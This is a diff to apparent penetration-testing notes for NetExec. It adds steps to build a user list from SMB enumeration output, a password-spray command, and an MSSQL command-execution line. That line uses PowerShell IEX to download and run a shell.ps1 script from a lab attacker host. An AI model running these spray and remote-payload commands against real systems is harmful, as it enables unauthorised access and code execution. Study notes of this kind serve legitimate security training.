@@ -11,6 +11,11 @@
   ```bash
   nxc smb <dc hname> -u <user> -p <password> --users
   ```
+  Create a user list
+  - Copy output to a .txt file
+  ```bash
+  cat <users.txt> |awk '{print $5}' > userlist.txt
+  ```
 * Enumerate Shares
   ```bash
   nxc smb <dc hname> -u <user> -p <password> --shares
@@ -29,6 +34,8 @@
   ```
 * Password Spray
   ```bash
+  nxc smb <hname or ip> -u <users.txt> -p <password_to_test> --continue-on-success
+  ```
 
 ## SQL
 * Run commands
@@ -40,3 +47,8 @@
   nxc mssql <hname> -u <user> -p <password> -X $command
   ```
   If you get an error about an untrusted domain and integrated authentication, use the `--local-auth` tag
+* Download a file
+  ```bash
+  nxc mssql <hname> -u <user> -p <pass> --local-auth -X 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.14:8000/shell.ps1")'
+  ```
+
